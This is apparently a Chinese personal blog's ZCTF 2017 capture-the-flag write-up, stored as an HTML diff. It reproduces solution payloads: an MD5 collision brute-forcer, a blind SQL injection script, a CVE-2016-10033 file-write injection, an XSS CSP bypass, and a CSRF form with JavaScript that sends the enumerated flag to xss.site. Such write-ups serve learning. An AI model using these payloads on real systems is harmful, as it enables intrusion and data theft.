@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Isron" />
+
+
+
+<meta name="description" content="觉得ZCTF很难，自己还需要很大的努力">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ZCTF2017">
+<meta property="og:url" content="http://isron.dropsec.xyz/2017/03/01/ZCTF2017/index.html">
+<meta property="og:site_name" content="Isron">
+<meta property="og:description" content="觉得ZCTF很难，自己还需要很大的努力">
+<meta property="og:image" content="http://p1.bqimg.com/567571/ac0119c72d4ee393.png">
+<meta property="og:image" content="http://i1.piimg.com/567571/f772dc1795c208e3.png">
+<meta property="og:updated_time" content="2017-03-16T09:16:04.055Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ZCTF2017">
+<meta name="twitter:description" content="觉得ZCTF很难，自己还需要很大的努力">
+<meta name="twitter:image" content="http://p1.bqimg.com/567571/ac0119c72d4ee393.png">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Isron" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/111.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>ZCTF2017 | Isron</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-56ff76c972fc0cf9"></script>
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?d225745dd35ee207c5a863746000dcea";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/111.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Isron</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">The dream is to be realized.</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>Menu</li>
+                        <li>Tags</li>
+                        
+                        <li>Friends</li>
+                        
+                        
+                        <li>About Me</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="https://mail.qq.com/cgi-bin/frame_html?sid=mNwN2kOtKnfYdjpt&r=745214a32ef2dee5dd3d9b17d5d30fd0" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" href="http://weibo.com/3262993654/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/clearloveQAQ" title="GitHub"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP序列化/">PHP序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/">SQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WAF/">WAF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/总结/">总结</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/环境配置/">环境配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/读书笔记/">读书笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/随笔/">随笔</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://rcoil.github.io/">RcoIl</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">一个正在学习的菜鸡</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Isron</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/111.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Isron</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">The dream is to be realized.</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="https://mail.qq.com/cgi-bin/frame_html?sid=mNwN2kOtKnfYdjpt&r=745214a32ef2dee5dd3d9b17d5d30fd0" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="http://weibo.com/3262993654/profile?rightmod=1&wvr=6&mod=personinfo&is_all=1" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/clearloveQAQ" title="GitHub"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+</nav>
+      <div class="body-wrap"><article id="post-ZCTF2017" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/03/01/ZCTF2017/" class="article-date">
+      <time datetime="2017-03-01T01:02:19.000Z" itemprop="datePublished">2017-03-01</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ZCTF2017
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>觉得ZCTF很难，自己还需要很大的努力<a id="more"></a></p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web100"><a href="#Web100" class="headerlink" title="Web100"></a>Web100</h2><p>进去就一个ha？，当时没找到源码，别人给的，做完了才找到，其实就是<code>.index.php.swp</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">$flag = $_GET[<span class="string">'flag'</span>];</div><div class="line"><span class="keyword">if</span> ($flag != <span class="string">'15562'</span>) &#123;</div><div class="line">	<span class="keyword">if</span> (strstr($flag, <span class="string">'zctf'</span>)) &#123;</div><div class="line">		<span class="keyword">if</span> (substr(md5($flag),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</div><div class="line">			<span class="keyword">die</span>(<span class="string">'ZCTF&#123;#########&#125;'</span>);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">die</span>(<span class="string">'ha?'</span>)</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>就是一个md5的碰撞，写个脚本跑一下就有了<br><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"><span class="keyword">import</span> <span class="built_in">string</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">string</span>.<span class="name">lowercase</span>:</div><div class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">99999</span>):</div><div class="line">                a=i+<span class="string">'zctf'</span>+str(z)</div><div class="line">                b=str(a)</div><div class="line">                c=hashlib.md5(b)</div><div class="line">                d=str(c.hexdigest())</div><div class="line">                <span class="keyword">if</span>(d[<span class="number">8</span>:<span class="number">10</span>]==<span class="string">'0e'</span>):</div><div class="line">                        zzz=d[<span class="number">10</span>:<span class="number">24</span>]</div><div class="line">                        zz=<span class="number">0</span></div><div class="line">                        <span class="keyword">for</span> ss <span class="keyword">in</span> <span class="name">zzz</span>:</div><div class="line">                                <span class="keyword">if</span> ss.isalpha():</div><div class="line">                                        zz+=<span class="number">1</span></div><div class="line">                        <span class="keyword">if</span> zz==<span class="number">0</span>:</div><div class="line">                                <span class="built_in">print</span> d</div><div class="line">                                <span class="built_in">print</span> b</div></pre></td></tr></table></figure></p>
+<h2 id="Find-my-eyes"><a href="#Find-my-eyes" class="headerlink" title="Find my eyes"></a>Find my eyes</h2><p>当时没有做出来看了lorexxar的write up才知道CSP，当时做的时候除了在contact.php下留言会返回success，其他的都没有反应，而且存在CSP：通过CSP特定的语法对网站加载的资源进行限制。<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Content-Security-Policy	</div><div class="line"><span class="keyword">default</span>-src <span class="string">'self'</span>; script-src <span class="string">'self'</span> <span class="string">'unsafe-inline'</span>;</div><div class="line"><span class="keyword">default</span>-src <span class="string">'self'</span>: 只能使用自己的同源的js脚本。</div><div class="line">script-src <span class="string">'self'</span>： 同样是同源策略</div><div class="line"><span class="keyword">unsafe</span>-<span class="keyword">inline</span> : 只允许使用内联资源</div></pre></td></tr></table></figure></p>
+<p>对过滤的函数进行FUZZ:<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">eval</div><div class="line">document</div><div class="line"><span class="keyword">location</span></div><div class="line"><span class="title">href</span></div><div class="line">window</div><div class="line">src</div><div class="line">svg</div><div class="line">img</div><div class="line">open</div><div class="line">callback</div><div class="line">单双引号</div><div class="line">括号</div><div class="line">反斜杠</div><div class="line">$\<span class="comment">#</span></div></pre></td></tr></table></figure></p>
+<p>附上师傅们csp bypass的payload：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="comment">//@ sourceMappingURL=http://0xb.pw</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<h2 id="easy-apk"><a href="#easy-apk" class="headerlink" title="easy apk"></a>easy apk</h2><p>当时没做出来，也没什么头绪，看了write up发现就是一个注入题目和CVE-2016-10033的利用，通过测试发现过滤掉了<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(</div><div class="line">)</div><div class="line">&amp;</div><div class="line">|</div><div class="line"><span class="class"><span class="keyword">union</span> <span class="title">select</span></span></div><div class="line">from</div><div class="line">password</div></pre></td></tr></table></figure></p>
+<p>而且过滤的是union+select,那么就利用<code>union distinct select</code>绕过过滤，附上HeartSky师傅的脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(name)</span>:</span> </div><div class="line">    key = <span class="string">"1470"</span>*<span class="number">100</span></div><div class="line">    name =  <span class="string">''</span>.join(reversed(list(name)))</div><div class="line">    tmp=[]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(name)):</div><div class="line">        tmp.append(hex(ord(name[i])^ord(key[i]))[<span class="number">2</span>:].zfill(<span class="number">2</span>))</div><div class="line"></div><div class="line">    enc = <span class="string">''</span>.join(tmp)</div><div class="line">    <span class="keyword">return</span> enc</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPassword</span><span class="params">()</span>:</span></div><div class="line">    password = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</div><div class="line">            name = <span class="string">"admin' union distinct select 1,'test','"</span> + password + chr(j) + <span class="string">"' order by 3 desc#"</span></div><div class="line">            enc = encrypt(name)</div><div class="line">            payload = &#123;<span class="string">'username'</span>:enc, <span class="string">'password'</span>:<span class="number">111</span>&#125;</div><div class="line">            r = requests.post(<span class="string">'http://58.213.63.30:10005'</span>, data=payload)</div><div class="line">            <span class="keyword">if</span> <span class="string">'test'</span> <span class="keyword">in</span> r.text:</div><div class="line">                password += chr(j<span class="number">-1</span>)</div><div class="line">                <span class="keyword">print</span> password</div><div class="line">                <span class="keyword">break</span>           </div><div class="line"></div><div class="line"><span class="comment"># print encrypt("admin' union distinct select 0,2,3 order by 1 asc#")</span></div><div class="line">getPassword()</div></pre></td></tr></table></figure></p>
+<p>得到密码登录之后就利用CVE-2016-10033漏洞进行写入<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a( -X<span class="regexp">/var/</span>www<span class="regexp">/html/</span>upload<span class="regexp">/test.php -OQueueDirectory=/</span>tmp )<span class="meta">@qq</span>.com</div></pre></td></tr></table></figure></p>
+<p>访问得到flag</p>
+<h2 id="onlymyself"><a href="#onlymyself" class="headerlink" title="onlymyself"></a>onlymyself</h2><p>看不太懂，主要知识点包含了CSRF，XSS记一下fp的CSRF脚本与通过search.php枚举flag.<br>CSRF:<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;form <span class="built_in">id</span>=<span class="string">"ffrom"</span> action=<span class="string">"http://58.213.63.30:10003/checkProfile.php"</span> method=<span class="string">"POST"</span> <span class="built_in">id</span>=<span class="string">"profile"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line">&lt;input type=<span class="string">"file"</span> <span class="built_in">id</span>=<span class="string">"image"</span> <span class="built_in">name</span>=<span class="string">"image"</span> data-filename-placement=<span class="string">"inside"</span> style=<span class="string">"left: -179.99px; top: 19.3333px;"</span>&gt;&lt;/a&gt;</div><div class="line">&lt;input <span class="built_in">name</span>=<span class="string">"nick"</span> <span class="built_in">id</span>=<span class="string">"nick"</span> value=<span class="string">"&lt;scriimgpt src=//xss.site/1.js&gt;/*"</span>&gt;</div><div class="line">&lt;input <span class="built_in">name</span>=<span class="string">"age"</span> <span class="built_in">id</span>=<span class="string">"age"</span> value =<span class="string">"2"</span>&gt;</div><div class="line">&lt;input <span class="built_in">name</span>=<span class="string">"address"</span> <span class="built_in">id</span>=<span class="string">"address"</span> value=<span class="string">"&lt;/scripimgt&gt;"</span>&gt;</div><div class="line">&lt;input <span class="built_in">class</span>=<span class="string">"btn btn-primary"</span> <span class="built_in">id</span>=<span class="string">"submit"</span> <span class="built_in">name</span>=<span class="string">"submit"</span> type=<span class="string">"submit"</span> value=<span class="string">"Submit"</span>&gt;&lt;/<span class="keyword">div</span>&gt;</div><div class="line">        &lt;/form&gt;</div><div class="line">&lt;<span class="keyword">script</span>&gt;submit.click()&lt;/<span class="keyword">script</span>&gt;</div></pre></td></tr></table></figure></p>
+<p>seaech:<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">tab=<span class="string">"_0123456789abcdefghijklmnopqrstuvwxyz&#125;"</span></div><div class="line"><span class="built_in">str</span>=<span class="string">''</span></div><div class="line">$.ajaxSettings.async=<span class="literal">false</span></div><div class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</div><div class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;tab.length;i++)&#123;</div><div class="line">    <span class="comment">//console.log(tab[i]);</span></div><div class="line">    <span class="built_in">flag</span>=<span class="literal">false</span></div><div class="line">    x=$.get(<span class="string">'http://58.213.63.30:10003/search.php?keywords=zctf&#123;'</span>+<span class="built_in">str</span>+<span class="string">'\'</span>+tab[i]);</div><div class="line">    <span class="keyword">if</span>(x.status==<span class="number">404</span>) <span class="built_in">flag</span>=<span class="literal">true</span>;</div><div class="line">    <span class="keyword">if</span>(!<span class="built_in">flag</span>) break;</div><div class="line">  &#125;</div><div class="line">  <span class="built_in">str</span>+=tab[i];</div><div class="line">  console.<span class="built_in">log</span>(<span class="built_in">str</span>);</div><div class="line">  <span class="keyword">if</span>(tab[i]==<span class="string">'&#125;'</span>) break;</div><div class="line">&#125;</div><div class="line"><span class="built_in">location</span>.href=’<span class="comment">//xss.site’+str</span></div></pre></td></tr></table></figure></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Russian-Zip"><a href="#Russian-Zip" class="headerlink" title="Russian Zip"></a>Russian Zip</h2><p>打开发现提示要密码，也没给关于密码的Hint，想到可能是伪加密，利用zip修复工具，就可修复伪加密，也可以利用十六进制工具对文件头的加密标志位做修改<a href="http://blog.csdn.net/ETF6996/article/details/51946250" target="_blank" rel="external">zip伪加密</a>打开发现是我的世界的存档，加载一下出flag</p>
+<h2 id="whisper"><a href="#whisper" class="headerlink" title="whisper"></a>whisper</h2><p>用winhex打开hint发现后面一大串base64代码，复制下来利用python去解<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">import base64</div><div class="line"><span class="keyword">a</span> = <span class="built_in">open</span>(<span class="string">'AA.txt'</span>,<span class="string">'rb'</span>)</div><div class="line">b = <span class="keyword">a</span>.<span class="built_in">read</span>()</div><div class="line">c = base64.b64decode(b)</div><div class="line">f = <span class="built_in">open</span>(<span class="string">'BB.txt'</span>,<span class="string">'w'</span>)</div><div class="line">f.<span class="built_in">write</span>(c)</div><div class="line">f.<span class="built_in">close</span>()</div></pre></td></tr></table></figure></p>
+<p>发现失败了，后来看了大佬的write up才发现前面多了一个E。。。解开之后利用<code>binwalk -e</code><br><img src="http://p1.bqimg.com/567571/ac0119c72d4ee393.png" alt=""><br>提取文件然后<code>cat *</code>查找下password得到密码打开压缩包获得flag<br><img src="http://i1.piimg.com/567571/f772dc1795c208e3.png" alt=""></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>Title:</span><a href="/2017/03/01/ZCTF2017/">ZCTF2017</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage">Isron</a></p>
+        <p><span>Created:</span>2017-03-01, 09:02:19</p>
+        <p><span>Updated:</span>2017-03-16, 17:16:04</p>
+        <p>
+            <span>Full URL:</span><a class="post-url" href="/2017/03/01/ZCTF2017/" title="ZCTF2017">http://isron.dropsec.xyz/2017/03/01/ZCTF2017/</a>
+            <span class="copy-path" data-clipboard-text="From http://isron.dropsec.xyz/2017/03/01/ZCTF2017/　　By Isron" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2017/03/01/Jarvis-OJ-神盾局的秘密/">
+                    Jarvis OJ 神盾局的秘密
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/02/22/百度杯二月第二场/">
+                    百度杯二月第二场
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web100"><span class="toc-number">1.1.</span> <span class="toc-text">Web100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Find-my-eyes"><span class="toc-number">1.2.</span> <span class="toc-text">Find my eyes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-apk"><span class="toc-number">1.3.</span> <span class="toc-text">easy apk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#onlymyself"><span class="toc-number">1.4.</span> <span class="toc-text">onlymyself</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Russian-Zip"><span class="toc-number">2.1.</span> <span class="toc-text">Russian Zip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#whisper"><span class="toc-number">2.2.</span> <span class="toc-text">whisper</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+    <script>
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+
+    
+        <div class="addthis_sharing_toolbox"></div>
+    
+</div>
+
+
+
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <div id="comment-box" ></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2017/03/01/ZCTF2017/" data-title="ZCTF2017" data-url="http://isron.dropsec.xyz/2017/03/01/ZCTF2017/"></div>
+    <script>
+        var duoshuoQuery = {short_name:"clearloveqaq"};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+    </script>
+    
+    <script> loadComment(); </script>
+
+</div>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2017/03/01/Jarvis-OJ-神盾局的秘密/" title="Pre: Jarvis OJ 神盾局的秘密">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2017/02/22/百度杯二月第二场/" title="Next: 百度杯二月第二场">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/03/15/Linux下命令分割符的区别/">Linux 下命令分割符的区别</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/15/NJCTF2017/">NJCTF2017</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/Jarvis-OJ-api调用/">Jarvis OJ api调用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/05/简单的Python爬虫/">简单的Python爬虫</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/03/PHP序列化与反序列化/">PHP序列化与反序列化</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/01/Jarvis-OJ-神盾局的秘密/">Jarvis OJ 神盾局的秘密</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/01/ZCTF2017/">ZCTF2017</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/22/百度杯二月第二场/">百度杯二月第二场</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/01/ubuntu下LAMP的环境配置/">ubuntu下LAMP的环境配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/17/一些感想/">一些感想</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/14/CTF知识点总结/">CTF知识点总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/09/南邮/">南邮CTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/08/http协议/">http协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/25/sqli-labs学习笔记总结/">sqli-labs学习笔记总结</a></li><li class="post-list-item"><a class="post-list-link" 